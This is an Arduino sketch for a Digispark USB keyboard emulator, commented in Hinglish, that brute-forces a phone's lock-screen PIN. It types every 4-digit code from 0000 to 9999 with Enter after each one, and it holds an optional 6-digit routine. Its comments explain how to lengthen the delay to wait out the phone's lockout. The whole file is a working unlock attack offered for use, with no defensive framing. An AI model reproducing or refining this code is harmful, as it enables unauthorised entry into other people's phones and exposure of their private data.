#include "DigiKeyboard.h"

// Ye script 0000 se shuru karke numbers try karegi
void setup() {
  DigiKeyboard.delay(2000); // Phone se connect hone ka wait
}

void bruteForce4Digit() {
  for (int i = 0; i <= 9999; i++) {
    // Number ko 4-digit format mein convert karna (e.g., 5 -> 0005)
    char pin[5];
    sprintf(pin, "%04d", i);
    
    DigiKeyboard.print(pin);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
    
    // Yahan delay zaroori hai taaki phone "Wrong PIN" process kar sake
    // Agar phone lock kar raha hai, toh is delay ko badhana padega (e.g., 31000)
    DigiKeyboard.delay(1000); 
  }
}

void bruteForce6Digit() {
  for (long i = 0; i <= 999999; i++) {
    char pin[7];
    sprintf(pin, "%06ld", i);
    
    DigiKeyboard.print(pin);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    
    DigiKeyboard.delay(1000);
  }
}

void loop() {
  // Pehle 4-digit try karne ke liye:
  bruteForce4Digit();
  
  // Agar 4-digit fail ho toh 6-digit (Warning: isme bahut din lag sakte hain)
  // bruteForce6Digit(); 
  
  for(;;); // Ek baar khatam hone par ruk jaye
}
